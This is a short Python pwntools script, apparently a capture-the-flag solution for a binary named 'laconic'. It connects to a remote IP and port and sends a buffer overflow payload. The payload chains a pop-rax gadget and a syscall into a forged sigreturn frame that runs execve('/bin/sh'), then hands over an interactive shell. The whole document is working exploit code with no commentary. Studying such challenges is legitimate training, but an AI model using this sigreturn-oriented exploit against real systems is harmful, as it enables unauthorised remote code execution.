from pwn import *

#p = gdb.debug("./laconic","break *0x0000000000043017")
p = remote("83.136.251.145",35382)
#p = process("./laconic")
context.log_level = "debug"
context.arch = 'amd64'

pop_rax = 0x0000000000043018
start =0x0000000000043000
syscall = 0x0000000000043015

pause()

binsh = 0x43238
# fake signal frame
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = binsh
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall

payload = b'a' * 8 + p64(pop_rax) + p64(0xf)+p64(syscall) + bytes(sigframe)
p.send(payload)
p.interactive()